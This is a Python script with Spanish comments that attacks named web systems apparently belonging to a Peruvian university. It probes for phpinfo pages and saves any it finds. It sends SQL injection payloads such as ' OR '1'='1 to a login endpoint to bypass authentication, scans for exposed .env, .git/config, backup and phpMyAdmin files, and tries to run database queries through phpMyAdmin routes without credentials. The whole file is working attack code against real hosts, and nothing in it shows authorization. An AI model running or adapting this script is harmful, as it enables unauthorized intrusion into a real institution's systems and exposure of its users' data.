#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BUSCAR VULNERABILIDADES REALES EN LAS APLICACIONES
"""
import requests
import urllib3
import re
import json
urllib3.disable_warnings()

print("=" * 70)
print("  BUSQUEDA DE VULNERABILIDADES EN APLICACIONES")
print("=" * 70)

# ============================================
# 1. Intentar acceder a phpinfo en sigea
# ============================================
print("\n[1] Buscando phpinfo en sigea.uns.edu.pe")
print("-" * 50)

sigea = "https://sigea.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# Try common paths where phpinfo might be
phpinfo_paths = [
    f"{sigea}/phpinfo.php",
    f"{sigea}/info.php",
    f"{sigea}/phpinfo",
    f"{sigea}/info",
    f"{sigea}/phpinfo.php3",
    f"{sigea}/phpinfo.php5",
    f"{sigea}/phpinfo.php7",
]

for path in phpinfo_paths:
    try:
        r = s.get(path, timeout=5)
        if r.status_code == 200 and 'phpinfo' in r.text.lower():
            print(f"  [!] phpinfo encontrado: {path}")
            # Extract key info
            ver = re.search(r'PHP Version\s*([^<]+)', r.text)
            if ver:
                print(f"  Version PHP: {ver.group(1)}")
            server = re.search(r'Server Software</td><td class="v">(.*?)</td>', r.text)
            if server:
                print(f"  Server: {server.group(1)}")
            docroot = re.search(r'Document Root</td><td class="v">(.*?)</td>', r.text)
            if docroot:
                print(f"  Document Root: {docroot.group(1)}")
            # Save
            with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\phpinfo_sigea.html", "w") as f:
                f.write(r.text)
            print(f"  [+] Guardado en phpinfo_sigea.html")
            break
    except:
        pass

# ============================================
# 2. Verificar si el SIIGAA tiene SQL injection
# ============================================
print("\n\n[2] Verificando SIIGAA para SQL Injection")
print("-" * 50)

# Find the SIIGAA login page
siigaa_login_urls = [
    f"{sigea}/udemsi/faces/modulos.xhtml",
    f"{sigea}/sigea/login.xhtml",
    f"{sigea}/login.xhtml",
    f"{sigea}/j_security_check",
]

# Check if the login form exists
for url in siigaa_login_urls:
    try:
        r = s.get(url, timeout=5)
        if r.status_code == 200:
            # Look for login form
            if 'j_username' in r.text or 'j_password' in r.text:
                print(f"  [+] Formulario de login encontrado en: {url}")
                # Extract form action
                form_action = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', r.text)
                print(f"  Form action: {form_action}")
                
                # Test SQL injection on login
                # Try injecting ' OR '1'='1' -- in username field
                test_payloads = [
                    ("' OR '1'='1", "' OR '1'='1"),
                    ("admin' --", "test"),
                    ("' UNION SELECT NULL,NULL --", "test"),
                    ("admin", "' OR '1'='1' --"),
                ]
                
                for user, pwd in test_payloads:
                    try:
                        r2 = s.post(
                            f"{sigea}/j_security_check",
                            data={"j_username": user, "j_password": pwd},
                            timeout=5,
                            allow_redirects=True
                        )
                        if r2.status_code == 200 and len(r2.text) > 500:
                            # Check if we got past login
                            if 'logout' in r2.text.lower() or 'modulos' in r2.text.lower() or 'bienvenida' in r2.text.lower():
                                print(f"  [!] SQL INJECTION EXITOSA!")
                                print(f"  [!] Usuario: {user}")
                                print(f"  [!] Password: {pwd}")
                                print(f"  [!] Acceso al sistema obtenido!")
                                break
                            elif len(r2.text) < 200 or 'error' in r2.text.lower() or 'invalid' in r2.text.lower():
                                pass  # Login failed
                    except:
                        pass
                break
    except:
        pass

# ============================================
# 3. Buscar archivos sensibles en sigea
# ============================================
print("\n\n[3] Buscando archivos sensibles en sigea")
print("-" * 50)

sensitive_paths = [
    f"{sigea}/.env",
    f"{sigea}/.git/config",
    f"{sigea}/web.config",
    f"{sigea}/config.php",
    f"{sigea}/config.inc.php",
    f"{sigea}/settings.php",
    f"{sigea}/backup.zip",
    f"{sigea}/backup.tar.gz",
    f"{sigea}/.htaccess",
    f"{sigea}/robots.txt",
    f"{sigea}/sitemap.xml",
    f"{sigea}/crossdomain.xml",
    f"{sigea}/server-status",
    f"{sigea}/server-info",
    f"{sigea}/phpmyadmin",
    f"{sigea}/pma",
]

for path in sensitive_paths:
    try:
        r = s.get(path, timeout=3)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"  [!] ACCESIBLE: {path} (HTTP {r.status_code}, {len(r.text)} bytes)")
            # Check if it contains sensitive info
            if any(kw in r.text.lower() for kw in ['password', 'secret', 'key', 'token', 'credential', 'mysql']):
                print(f"  [!] Contiene informacion sensible!")
            if len(r.text) < 500:
                print(f"  Content: {r.text[:200]}")
    except:
        pass

# ============================================
# 4. Verificar si orcl.uns.edu.pe tiene phpMyAdmin accesible
# ============================================
print("\n\n[4] Verificando orcl.uns.edu.pe con ?route=")
print("-" * 50)

orcl = "https://orcl.uns.edu.pe"
o = requests.Session()
o.verify = False
o.headers.update({'User-Agent': 'Mozilla/5.0'})

# Try accessing phpMyAdmin data via different routes
# that might bypass authentication
orcl_routes = [
    f"{orcl}/index.php?route=/server/databases",
    f"{orcl}/index.php?route=/sql&server=1&sql_query=SELECT+USER()",
    f"{orcl}/index.php?route=/server_status",
    f"{orcl}/index.php?route=/home",
]

for url in orcl_routes:
    try:
        r = o.get(url, timeout=5)
        if r.status_code == 200 and len(r.text) > 100:
            has_login = 'login' in r.text.lower()
            has_logout = 'logout' in r.text.lower()
            has_data = '<td' in r.text
            print(f"  {url[:60]}")
            print(f"    HTTP {r.status_code}, login={has_login}, logout={has_logout}, data={has_data}")
            if has_data and not has_login:
                print(f"  [!] DATOS ACCESIBLES SIN LOGIN!")
                # Extract table data
                tds = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
                if tds:
                    print(f"  Datos: {tds[:10]}")
            elif has_logout:
                print(f"  [!] SESION ACTIVA - datos visibles!")
                tds = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
                if tds:
                    print(f"  Datos: {tds[:10]}")
    except:
        pass

# ============================================
# 5. Intentar acceso directo a BD via orcl
# ============================================
print("\n\n[5] Intentando acceso directo a datos en orcl")
print("-" * 50)

# Try different SQL queries
# that might work without authentication
sql_queries = [
    ("SELECT USER()", "SELECT USER()"),
    ("SELECT DATABASE()", "SELECT DATABASE()"),
    ("SELECT VERSION()", "SELECT VERSION()"),
    ("SHOW DATABASES", "SHOW DATABASES"),
    ("SELECT CURRENT_USER()", "SELECT CURRENT_USER()"),
]

for label, query in sql_queries:
    # Try via the /sql.php endpoint (which uses ?route= now)
    for url_format in [
        f"{orcl}/index.php?route=/sql&server=1&sql_query={query}",
        f"{orcl}/index.php?route=/sql&sql_query={query}",
    ]:
        try:
            r = o.get(url_format, timeout=5)
            if r.status_code == 200:
                # Check if the query was executed
                if label.split()[1] in r.text or label.split()[0] in r.text or 'root' in r.text:
                    print(f"  [+] {label} -> HTTP {r.status_code}")
                    # Extract results
                    tds = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
                    if tds:
                        print(f"    Resultado: {tds}")
        except:
            pass

# ============================================
# 6. Verificar si hay archivos .phar o zip
# ============================================
print("\n\n[6] Buscando archivos descargables")
print("-" * 50)

download_paths = [
    f"{sigea}/download.php",
    f"{sigea}/export.php",
    f"{sigea}/download",
    f"{sigea}/exports",
    f"{sigea}/backup",
]

for path in download_paths:
    try:
        r = s.get(path, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [+] {path} -> HTTP {r.status_code} ({len(r.text)} bytes)")
    except:
        pass

# ============================================
# 7. Verificar si la consola de administracion de sigea tiene acceso
# ============================================
print("\n\n[7] Buscando admin panels en sigea")
print("-" * 50)

admin_paths = [
    f"{sigea}/admin",
    f"{sigea}/administrator",
    f"{sigea}/administracion",
    f"{sigea}/panel",
    f"{sigea}/dashboard",
    f"{sigea}/gestion",
    f"{sigea}/modulos",
    f"{sigea}/udemsi",
]

for path in admin_paths:
    try:
        r = s.get(path, timeout=3)
        if r.status_code == 200 and len(r.text) > 200:
            has_admin = 'admin' in r.text.lower() or 'login' in r.text.lower() or 'dashboard' in r.text.lower()
            print(f"  {path} -> HTTP {r.status_code} (len={len(r.text)}, admin_content={has_admin})")
            if has_admin:
                # Check if it's accessible without login
                if 'logout' in r.text.lower() or 'bienvenida' in r.text.lower():
                    print(f"  [!] ACCESIBLE SIN LOGIN!")
    except:
        pass

print("\n\n--- FIN ---")
